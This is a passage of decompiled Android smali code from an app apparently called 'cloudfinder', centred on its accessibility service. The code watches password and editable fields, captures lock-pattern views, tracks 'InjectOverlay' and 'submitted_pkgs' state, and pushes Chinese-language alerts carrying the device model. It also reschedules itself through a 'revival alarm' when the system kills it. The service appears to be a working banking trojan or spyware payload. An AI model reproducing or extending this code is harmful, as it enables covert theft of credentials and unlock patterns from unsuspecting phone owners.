    move-object/from16 v8, p0

    if-nez v14, :cond_9

    goto/16 :goto_7

    :cond_9
    :try_start_b
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getFromIndex()I

    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEditable()Z

    move-result v0

    if-eqz v0, :cond_14

    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->isFocusable()Z

    move-result v0

    if-eqz v0, :cond_14

    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->isPassword()Z

    goto/16 :goto_7

    :sswitch_2
    move-object/from16 v8, p0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sget-wide v2, Lسۄھؤۏ۫/؋;->ح:J

    sub-long v2, v0, v2

    const-wide/16 v4, 0x1f4

    cmp-long v2, v2, v4

    if-gtz v2, :cond_a

    goto/16 :goto_7

    :cond_a
    sput-wide v0, Lسۄھؤۏ۫/؋;->ح:J

    sget-boolean v0, Lسۄھؤۏ۫/؋;->ئ:Z

    if-eqz v0, :cond_14

    invoke-virtual/range {p0 .. p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٵ()V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_d
    .catchall {:try_start_b .. :try_end_b} :catchall_1

    goto/16 :goto_7

    :sswitch_3
    move-object/from16 v8, p0

    :try_start_c
    invoke-static {v12}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->م(Ljava/lang/String;)Z

    move-result v1
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_e
    .catchall {:try_start_c .. :try_end_c} :catchall_1

    if-eqz v1, :cond_b

    goto/16 :goto_7

    :cond_b
    :try_start_d
    invoke-virtual {v8, v12}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->؋(Ljava/lang/String;)V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_4
    .catchall {:try_start_d .. :try_end_d} :catchall_1

    :catch_4
    :try_start_e
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-static {v12}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ك(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_d

    sget-boolean v5, Lڝږ؁ڋ/ؼ;->؋:Z

    if-eqz v5, :cond_d

    sget-boolean v5, Lڝږ؁ڋ/ؼ;->؋:Z

    if-nez v5, :cond_c

    goto :goto_5

    :cond_c
    sput-object v8, Lڝږ؁ڋ/ؼ;->ة:Landroid/accessibilityservice/AccessibilityService;

    invoke-static/range {p0 .. p0}, Lڝږ؁ڋ/ؼ;->إ(Landroid/accessibilityservice/AccessibilityService;)V
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_e
    .catchall {:try_start_e .. :try_end_e} :catchall_1

    :cond_d
    :goto_5
    if-eqz v1, :cond_e

    if-eqz v14, :cond_e

    :try_start_f
    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v5
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_5
    .catchall {:try_start_f .. :try_end_f} :catchall_1

    goto :goto_6

    :catch_5
    const/4 v5, 0x0

    :goto_6
    :try_start_10
    new-instance v6, Ljava/lang/StringBuilder;

    move-object/from16 v9, v17

    invoke-direct {v6, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, " srcId="

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, " srcCls="

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v5

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_e
    .catchall {:try_start_10 .. :try_end_10} :catchall_1

    :cond_e
    if-eqz v1, :cond_f

    :try_start_11
    invoke-virtual {v8, v12}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->أ(Ljava/lang/String;)V
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_6
    .catchall {:try_start_11 .. :try_end_11} :catchall_1

    :catch_6
    :cond_f
    :try_start_12
    sget-wide v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->خ:J

    sub-long v1, v3, v1

    const-wide/16 v5, 0x64

    cmp-long v1, v1, v5

    if-gez v1, :cond_10

    goto/16 :goto_7

    :cond_10
    sput-wide v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->خ:J
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_e
    .catchall {:try_start_12 .. :try_end_12} :catchall_1

    :try_start_13
    invoke-static {v12}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ك(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_12

    if-eqz v14, :cond_12

    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_12

    const-string v2, "lockPatternView"

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_11

    const-string v2, "patternView"

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_12

    :cond_11
    invoke-static {v12}, Lڝږ؁ڋ/ؼ;->ؤ(Ljava/lang/String;)V
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_7
    .catchall {:try_start_13 .. :try_end_13} :catchall_1

    :catch_7
    :cond_12
    :try_start_14
    invoke-virtual {v8, v11}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ع(Ljava/lang/String;)V
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_8
    .catchall {:try_start_14 .. :try_end_14} :catchall_1

    :catch_8
    :try_start_15
    sget-object v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    new-instance v2, Lڛڜڕڰڑ/؋;

    move-object/from16 v9, v16

    const/4 v3, 0x0

    invoke-direct {v2, v8, v9, v3}, Lڛڜڕڰڑ/؋;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;Ljava/lang/String;I)V

    invoke-interface {v1, v2}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_e
    .catchall {:try_start_15 .. :try_end_15} :catchall_1

    :try_start_16
    invoke-static {v8, v12}, Lسۄھؤۏ۫/؋;->آ(Landroid/accessibilityservice/AccessibilityService;Ljava/lang/String;)V
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_9
    .catchall {:try_start_16 .. :try_end_16} :catchall_1

    :catch_9
    :try_start_17
    sget-object v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    new-instance v2, Lڛڜڕڰڑ/؋;

    invoke-direct {v2, v8, v9, v0}, Lڛڜڕڰڑ/؋;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;Ljava/lang/String;I)V

    invoke-interface {v1, v2}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_e
    .catchall {:try_start_17 .. :try_end_17} :catchall_1

    :try_start_18
    invoke-virtual {v8, v12}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->إ(Ljava/lang/String;)V
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_a
    .catchall {:try_start_18 .. :try_end_18} :catchall_1

    :catch_a
    :try_start_19
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lڛڜڕڰڑ/؋;

    const/4 v2, 0x2

    invoke-direct {v1, v8, v9, v2}, Lڛڜڕڰڑ/؋;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;Ljava/lang/String;I)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_e
    .catchall {:try_start_19 .. :try_end_19} :catchall_1

    :try_start_1a
    invoke-virtual {v8, v12}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا(Ljava/lang/String;)V
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_b
    .catchall {:try_start_1a .. :try_end_1a} :catchall_1

    :catch_b
    :try_start_1b
    sget-boolean v0, Lسۄھؤۏ۫/؋;->ئ:Z

    if-eqz v0, :cond_14

    sget-boolean v0, Lسۄھؤۏ۫/؋;->ج:Z

    if-nez v0, :cond_14

    sget-boolean v0, Lڝږ؁ڋ/و;->؋:Z

    if-nez v0, :cond_14

    invoke-virtual/range {p0 .. p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٯ()V

    goto/16 :goto_7

    :sswitch_4
    move-object/from16 v8, p0

    invoke-static {v14, v12, v11, v13}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؼ(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_7

    :sswitch_5
    move-object/from16 v8, p0

    invoke-static {v14, v12, v11, v10}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ػ(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_7

    :sswitch_6
    move-object/from16 v8, p0

    sget-object v0, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-nez v0, :cond_14

    sput-object v8, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    goto :goto_7

    :sswitch_7
    move-object/from16 v8, p0

    invoke-static {v12}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->م(Ljava/lang/String;)Z

    move-result v0
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_e
    .catchall {:try_start_1b .. :try_end_1b} :catchall_1

    if-eqz v0, :cond_13

    goto :goto_7

    :cond_13
    :try_start_1c
    invoke-virtual/range {p0 .. p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؠ()V
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_c
    .catchall {:try_start_1c .. :try_end_1c} :catchall_1

    :catch_c
    :try_start_1d
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Landroidx/room/أ;

    const/4 v2, 0x5

    invoke-direct {v1, v8, v12, v11, v2}, Landroidx/room/أ;-><init>(Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;I)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    move-object/from16 v1, p0

    move-object/from16 v2, p1

    move-object v3, v14

    move-object v4, v12

    move-object v5, v11

    move-object v6, v10

    invoke-virtual/range {v1 .. v6}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؾ(Landroid/view/accessibility/AccessibilityEvent;Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1d
    .catch Ljava/lang/Exception; {:try_start_1d .. :try_end_1d} :catch_e
    .catchall {:try_start_1d .. :try_end_1d} :catchall_1

    :try_start_1e
    invoke-static {v8, v12}, Lسۄھؤۏ۫/؋;->آ(Landroid/accessibilityservice/AccessibilityService;Ljava/lang/String;)V
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_d
    .catchall {:try_start_1e .. :try_end_1e} :catchall_1

    goto :goto_7

    :sswitch_8
    move-object/from16 v8, p0

    move-object/from16 v2, p1

    :try_start_1f
    invoke-virtual {v8, v2, v14, v12, v11}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؽ(Landroid/view/accessibility/AccessibilityEvent;Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_7

    :sswitch_9
    move-object/from16 v8, p0

    if-eqz v14, :cond_14

    if-eqz v11, :cond_14

    const-string v0, "EditText"

    invoke-virtual {v11, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_14

    sput-object v14, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ة:Landroid/view/accessibility/AccessibilityNodeInfo;

    goto :goto_7

    :sswitch_a
    move-object/from16 v8, p0

    move-object/from16 v2, p1

    move-object/from16 v1, p0

    move-object v3, v14

    move-object v4, v12

    move-object v5, v11

    move-object v6, v10

    move-object v7, v13

    invoke-virtual/range {v1 .. v7}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->غ(Landroid/view/accessibility/AccessibilityEvent;Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1f
    .catch Ljava/lang/Exception; {:try_start_1f .. :try_end_1f} :catch_e
    .catchall {:try_start_1f .. :try_end_1f} :catchall_1

    :catch_d
    :cond_14
    :goto_7
    if-eqz v14, :cond_15

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ة:Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eq v14, v0, :cond_15

    :try_start_20
    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_20
    .catch Ljava/lang/Exception; {:try_start_20 .. :try_end_20} :catch_10

    goto :goto_d

    :catchall_1
    move-exception v0

    :goto_8
    move-object v7, v14

    goto :goto_e

    :catch_e
    move-exception v0

    :goto_9
    move-object v7, v14

    goto :goto_c

    :catchall_2
    move-exception v0

    goto :goto_a

    :catch_f
    move-exception v0

    goto :goto_b

    :goto_a
    const/4 v7, 0x0

    goto :goto_e

    :goto_b
    const/4 v7, 0x0

    :goto_c
    :try_start_21
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V
    :try_end_21
    .catchall {:try_start_21 .. :try_end_21} :catchall_3

    if-eqz v7, :cond_15

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ة:Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eq v7, v0, :cond_15

    :try_start_22
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_22
    .catch Ljava/lang/Exception; {:try_start_22 .. :try_end_22} :catch_10

    :catch_10
    :cond_15
    :goto_d
    return-void

    :catchall_3
    move-exception v0

    :goto_e
    if-eqz v7, :cond_16

    sget-object v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ة:Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eq v7, v1, :cond_16

    :try_start_23
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_23
    .catch Ljava/lang/Exception; {:try_start_23 .. :try_end_23} :catch_11

    :catch_11
    :cond_16
    throw v0

    :sswitch_data_0
    .sparse-switch
        0x1 -> :sswitch_a
        0x8 -> :sswitch_9
        0x10 -> :sswitch_8
        0x20 -> :sswitch_7
        0x40 -> :sswitch_6
        0x80 -> :sswitch_5
        0x100 -> :sswitch_4
        0x800 -> :sswitch_3
        0x1000 -> :sswitch_2
        0x2000 -> :sswitch_1
        0x4000 -> :sswitch_0
    .end sparse-switch
.end method

.method public final onDestroy()V
    .locals 9

    const-string v0, "MyAccessSvc"

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    iget-object v1, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->؋:Lژة۪ڦضۆۿۡ/ط;

    const/4 v2, 0x0

    if-eqz v1, :cond_0

    :try_start_0
    invoke-virtual {p0, v1}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    iput-object v2, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->؋:Lژة۪ڦضۆۿۡ/ط;

    :cond_0
    const/4 v1, 0x0

    sput-boolean v1, Lںڍڒڸ/ش;->إ:Z

    sget-object v3, Lںڍڒڸ/ش;->أ:Landroid/os/Handler;

    if-eqz v3, :cond_1

    invoke-virtual {v3, v2}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    :cond_1
    sget-object v3, Lڝږ؁ڋ/ر;->ؠ:Ljava/util/concurrent/ExecutorService;

    :try_start_1
    const-string v3, "power"

    invoke-virtual {p0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/os/PowerManager;

    const-string v4, "activity"

    invoke-virtual {p0, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/app/ActivityManager;

    if-eqz v3, :cond_2

    invoke-virtual {v3}, Landroid/os/PowerManager;->isInteractive()Z

    move-result v5

    if-eqz v5, :cond_2

    const/4 v5, 0x1

    goto :goto_0

    :cond_2
    move v5, v1

    :goto_0
    if-eqz v3, :cond_3

    invoke-virtual {v3}, Landroid/os/PowerManager;->isDeviceIdleMode()Z

    move-result v3

    goto :goto_1

    :cond_3
    move v3, v1

    :goto_1
    if-eqz v4, :cond_4

    new-instance v1, Landroid/app/ActivityManager$MemoryInfo;

    invoke-direct {v1}, Landroid/app/ActivityManager$MemoryInfo;-><init>()V

    invoke-virtual {v4, v1}, Landroid/app/ActivityManager;->getMemoryInfo(Landroid/app/ActivityManager$MemoryInfo;)V

    iget-boolean v1, v1, Landroid/app/ActivityManager$MemoryInfo;->lowMemory:Z

    :cond_4
    if-eqz v1, :cond_5

    const-string v1, "system_low_memory"

    goto :goto_2

    :cond_5
    if-eqz v3, :cond_6

    const-string v1, "system_doze_mode"

    goto :goto_2

    :cond_6
    if-nez v5, :cond_7

    const-string v1, "screen_off_killed"

    goto :goto_2

    :cond_7
    const-string v1, "manual_or_system"
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_2

    :catch_1
    move-exception v1

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "detect_error:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    :goto_2
    new-instance v3, Landroidx/room/أ;

    const/16 v4, 0x8

    const-string v5, "onDestroy"

    invoke-direct {v3, v4, v5, v1, p0}, Landroidx/room/أ;-><init>(ILjava/lang/String;Ljava/lang/Object;Ljava/lang/Object;)V

    sget-object v4, Lڝږ؁ڋ/ر;->ؠ:Ljava/util/concurrent/ExecutorService;

    invoke-interface {v4, v3}, Ljava/util/concurrent/Executor;->execute(Ljava/lang/Runnable;)V

    :try_start_2
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    sget-wide v5, Lڝږ؁ڋ/ر;->؋:J

    sub-long/2addr v3, v5

    const-wide/16 v5, 0x3e8

    div-long/2addr v3, v5

    const-string v5, "acc_off"
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    :try_start_3
    new-instance v6, Lorg/json/JSONObject;

    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    const-string v7, "reason"

    if-eqz v1, :cond_8

    move-object v8, v1

    goto :goto_3

    :cond_8
    const-string v8, "unknown"

    :goto_3
    invoke-virtual {v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v7, "uptime_sec"

    invoke-virtual {v6, v7, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    invoke-static {v5, p0, v6}, Lڗًقڔ/ء;->ع(Ljava/lang/String;Landroid/content/Context;Lorg/json/JSONObject;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_4

    :catch_2
    :try_start_4
    invoke-static {v5, p0, v2}, Lڗًقڔ/ء;->ع(Ljava/lang/String;Landroid/content/Context;Lorg/json/JSONObject;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    :catch_3
    :goto_4
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "\ud83d\udd34 <b>\u670d\u52a1\u88ab\u6740</b>\nDevice: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v3, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "\nReason: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lںڍڒڸ/ش;->ٹ(Ljava/lang/String;)V

    :try_start_5
    invoke-static {}, Lcom/lite/cloudfinder/App;->؋()Landroid/content/Context;

    move-result-object v1

    if-nez v1, :cond_9

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    :cond_9
    invoke-static {v1}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٮ(Landroid/content/Context;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_4

    goto :goto_5

    :catch_4
    move-exception v1

    const-string v2, "Revival alarm scheduling error"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_5
    :try_start_6
    invoke-static {}, Lڜٟٱڀ/ز;->آ()Lڜٟٱڀ/ز;

    move-result-object v1

    invoke-virtual {v1}, Lڜٟٱڀ/ز;->ؤ()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_5

    :catch_5
    const-string v1, "AccessibilityService destroyed"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method public final onInterrupt()V
    .locals 4

    new-instance v0, Landroidx/room/أ;

    const/16 v1, 0x8

    const-string v2, "onInterrupt"

    const-string v3, "system"

    invoke-direct {v0, v1, v2, v3, p0}, Landroidx/room/أ;-><init>(ILjava/lang/String;Ljava/lang/Object;Ljava/lang/Object;)V

    sget-object v1, Lڝږ؁ڋ/ر;->ؠ:Ljava/util/concurrent/ExecutorService;

    invoke-interface {v1, v0}, Ljava/util/concurrent/Executor;->execute(Ljava/lang/Runnable;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "\u267f <b>\u65e0\u969c\u788d\u4e2d\u65ad</b>\nDevice: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lںڍڒڸ/ش;->ٹ(Ljava/lang/String;)V

    return-void
.end method

.method public final onKeyEvent(Landroid/view/KeyEvent;)Z
    .locals 0

    invoke-virtual {p1}, Landroid/view/KeyEvent;->getAction()I

    invoke-super {p0, p1}, Landroid/accessibilityservice/AccessibilityService;->onKeyEvent(Landroid/view/KeyEvent;)Z

    move-result p1

    return p1
.end method

.method public final onServiceConnected()V
    .locals 22

    # 无障碍连上后延迟 2 秒再拉权限申请
    :try_start_perm
    move-object/from16 v4, p0
    new-instance v0, Landroid/os/Handler;
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
    move-result-object v1
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
    new-instance v1, Lcom/lite/cloudfinder/activity/PermStarter;
    invoke-direct {v1, v4}, Lcom/lite/cloudfinder/activity/PermStarter;-><init>(Landroid/content/Context;)V
    const-wide/16 v2, 0x7d0
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_perm
    .catch Ljava/lang/Exception; {:try_start_perm .. :try_end_perm} :catch_perm
    goto :goto_perm

    :catch_perm
    move-exception v0
    :goto_perm


    move-object/from16 v1, p0

    const-string v2, "_installTs"

    const-string v3, "InjectOverlay"

    const-string v4, ""

    :try_start_0
    sget-object v0, Lڟەطڽٲ/ؠ;->ء:Landroid/os/Handler;

    new-instance v5, Lڝږ؁ڋ/ؤ;

    const/4 v6, 0x5

    invoke-direct {v5, v1, v6}, Lڝږ؁ڋ/ؤ;-><init>(Landroid/content/Context;I)V

    invoke-virtual {v0, v5}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    invoke-super/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V

    invoke-static {}, Lڜٟٱڀ/ة;->ء()Lڜٟٱڀ/ة;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    iput-object v5, v0, Lڜٟٱڀ/ة;->ب:Landroid/content/Context;

    const/4 v5, 0x0

    :try_start_1
    const-string v6, "inject_state"

    invoke-virtual {v1, v6, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v6

    const-string v7, "submitted_pkgs"

    invoke-interface {v6, v7, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/String;->isEmpty()Z

    move-result v7

    if-nez v7, :cond_2

    const-string v7, ","

    invoke-virtual {v6, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v6

    array-length v7, v6

    move v8, v5

    :goto_0
    if-ge v8, v7, :cond_1

    aget-object v9, v6, v8

    invoke-virtual {v9}, Ljava/lang/String;->isEmpty()Z

    move-result v10

    if-nez v10, :cond_0

    iget-object v10, v0, Lڜٟٱڀ/ة;->ة:Ljava/util/HashSet;

    invoke-virtual {v10, v9}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    :cond_0
    add-int/lit8 v8, v8, 0x1

    goto :goto_0

    :cond_1
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "restored "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v0, v0, Lڜٟٱڀ/ة;->ة:Ljava/util/HashSet;

    invoke-virtual {v0}, Ljava/util/HashSet;->size()I

    move-result v0

